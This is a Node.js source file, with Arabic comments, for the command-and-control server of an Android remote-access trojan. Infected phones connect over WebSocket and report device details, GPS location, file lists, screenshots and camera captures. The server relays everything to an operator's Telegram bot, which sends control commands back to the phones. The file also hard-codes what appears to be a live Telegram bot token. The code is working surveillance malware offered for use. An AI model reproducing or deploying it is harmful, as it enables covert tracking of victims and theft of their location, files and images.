const express = require('express');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const http = require('http');

// 🔧 الإعدادات - ضع بياناتك هنا
const config = {
    TELEGRAM_TOKEN: "8330048649:AAFYzP0EvuJTYm__yo4AROYvIt3fy-HDGXY", // توكنك
    AUTHORIZED_USERS: [7604667042], // أيدي التلجرام الخاص بك
    SERVER_PORT: process.env.PORT || 3000,
    SERVER_HOST: "0.0.0.0"
};

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ⚡ إنشاء البوت مع معالجة الأخطاء
let bot;
try {
    bot = new TelegramBot(config.TELEGRAM_TOKEN, { 
        polling: { 
            timeout: 10,
            interval: 300
        } 
    });
    console.log('✅ البوت تم إنشاؤه بنجاح');
} catch (error) {
    console.log('❌ خطأ في إنشاء البوت:', error);
    process.exit(1);
}

const connectedDevices = new Map();
const userSessions = new Map();

app.use(express.json());

// 🔌 اتصال WebSocket من APK
wss.on('connection', (ws, req) => {
    const deviceId = generateDeviceId();
    const clientIp = req.socket.remoteAddress;
    
    console.log(`📱 APK متصل: ${deviceId} من ${clientIp}`);
    
    connectedDevices.set(deviceId, {
        ws: ws,
        ip: clientIp,
        connectedAt: new Date(),
        info: {}
    });

    // ⚡ إرسال رسالة ترحيب للAPK
    ws.send(JSON.stringify({
        type: 'welcome',
        deviceId: deviceId,
        message: 'تم الاتصال بنجاح بالسيرفر',
        timestamp: Date.now(),
        status: 'connected'
    }));

    // 📨 إرسال إشعار للتلجرام إذا كان البوت شغال
    if (bot) {
        sendToTelegram(`📱 جهاز جديد متصل\n🎯 المعرف: ${deviceId}\n🌐 IP: ${clientIp}`);
    }

    // 📩 استقبال البيانات من APK
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data.toString());
            console.log(`📩 رسالة من ${deviceId}:`, message.type);
            handleAPKMessage(deviceId, message);
        } catch (error) {
            console.error('❌ خطأ في معالجة رسالة APK:', error);
        }
    });

    ws.on('close', () => {
        console.log(`❌ APK انقطع: ${deviceId}`);
        connectedDevices.delete(deviceId);
        if (bot) {
            sendToTelegram(`❌ جهاز انقطع: ${deviceId}`);
        }
    });

    ws.on('error', (error) => {
        console.error(`❌ خطأ في اتصال ${deviceId}:`, error);
    });
});

// ⚡ معالجة رسائل APK
function handleAPKMessage(deviceId, message) {
    const device = connectedDevices.get(deviceId);
    if (!device) return;

    if (bot) {
        switch (message.type) {
            case 'device_info':
                device.info = message.data;
                sendToTelegram(
                    `📊 معلومات الجهاز ${deviceId}\n` +
                    `📱 الموديل: ${message.data.model || 'غير معروف'}\n` +
                    `🤖 أندرويد: ${message.data.androidVersion || 'غير معروف'}\n` +
                    `🔋 البطارية: ${message.data.battery || 'غير معروف'}%`
                );
                break;

            case 'location':
                sendToTelegram(
                    `📍 موقع الجهاز ${deviceId}\n` +
                    `📌 خط الطول: ${message.data.longitude}\n` +
                    `📌 خط العرض: ${message.data.latitude}`
                );
                break;

            case 'screenshot_result':
                sendToTelegram(`✅ تم التقاط لقطة شاشة من ${deviceId}`);
                break;

            case 'camera_result':
                sendToTelegram(`✅ تم التقاط صورة من الكاميرا ${deviceId}`);
                break;

            case 'file_list':
                const files = message.data.files || [];
                sendToTelegram(
                    `📁 ملفات ${deviceId}\n` +
                    files.slice(0, 5).map(f => `📄 ${f}`).join('\n')
                );
                break;
        }
    }
}

// 🤖 أوامر التلجرام (إذا كان البوت شغال)
if (bot) {
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        
        if (!config.AUTHORIZED_USERS.includes(chatId)) {
            return bot.sendMessage(chatId, '❌ غير مصرح لك بالوصول');
        }

        const keyboard = {
            reply_markup: {
                keyboard: [
                    ['📊 حالة السيرفر', '📋 الأجهزة المتصلة'],
                    ['🖼️ لقطة شاشة', '📍 الموقع'],
                    ['📁 الملفات', '📷 الكاميرا']
                ],
                resize_keyboard: true
            }
        };

        bot.sendMessage(chatId, 
            `🎮 **مرحباً بك في نظام التحكم**\n\n` +
            `استخدم الأزرار للتحكم بالأجهزة.`,
            { parse_mode: 'Markdown', ...keyboard }
        );
    });

    bot.onText(/📋 الأجهزة المتصلة/, (msg) => {
        const chatId = msg.chat.id;
        if (!config.AUTHORIZED_USERS.includes(chatId)) return;

        if (connectedDevices.size === 0) {
            return bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة');
        }

        let devicesList = '📱 **الأجهزة المتصلة:**\n\n';
        connectedDevices.forEach((device, deviceId) => {
            devicesList += `🔹 ${deviceId}\n📍 ${device.ip}\n\n`;
        });

        bot.sendMessage(chatId, devicesList, { parse_mode: 'Markdown' });
    });

    bot.onText(/🖼️ لقطة شاشة/, (msg) => {
        const chatId = msg.chat.id;
        if (!config.AUTHORIZED_USERS.includes(chatId)) return;

        if (connectedDevices.size === 0) {
            return bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة');
        }

        // أخذ لقطة من أول جهاز متصل
        const firstDevice = Array.from(connectedDevices.keys())[0];
        sendToDevice(firstDevice, {
            type: 'take_screenshot'
        });

        bot.sendMessage(chatId, `📸 جاري أخذ لقطة شاشة من ${firstDevice}...`);
    });

    // معالجة الأخطاء في البوت
    bot.on('error', (error) => {
        console.log('❌ خطأ في البوت:', error.message);
    });
} else {
    console.log('⚠️ البوت غير نشط - التركيز على WebSocket فقط');
}

// ⚡ إرسال أمر لجهاز
function sendToDevice(deviceId, command) {
    const device = connectedDevices.get(deviceId);
    if (!device || !device.ws || device.ws.readyState !== WebSocket.OPEN) {
        console.log(`❌ الجهاز ${deviceId} غير متصل`);
        return false;
    }

    device.ws.send(JSON.stringify(command));
    console.log(`✅ تم إرسال أمر ${command.type} لـ ${deviceId}`);
    return true;
}

// 📨 إرسال رسالة للتلجرام
function sendToTelegram(message) {
    if (!bot) return;
    
    config.AUTHORIZED_USERS.forEach(userId => {
        bot.sendMessage(userId, message).catch(err => {
            console.error('❌ فشل إرسال للتلجرام:', err.message);
        });
    });
}

// 🛠️ وظائف مساعدة
function generateDeviceId() {
    return 'device_' + Math.random().toString(36).substring(2, 8);
}

// 🚀 بدء السيرفر
server.listen(config.SERVER_PORT, config.SERVER_HOST, () => {
    console.log(`🎯 سيرفر WebSocket يعمل على: http://${config.SERVER_HOST}:${config.SERVER_PORT}`);
    console.log(`📱 جاهز لاستقبال اتصالات APK`);
    
    if (bot) {
        console.log(`🤖 البوت نشط`);
    } else {
        console.log(`⚠️ البوت غير نشط - ركز على WebSocket`);
    }
});

// معالجة الأخطاء العامة
process.on('uncaughtException', (error) => {
    console.error('❌ خطأ غير متوقع:', error);
});

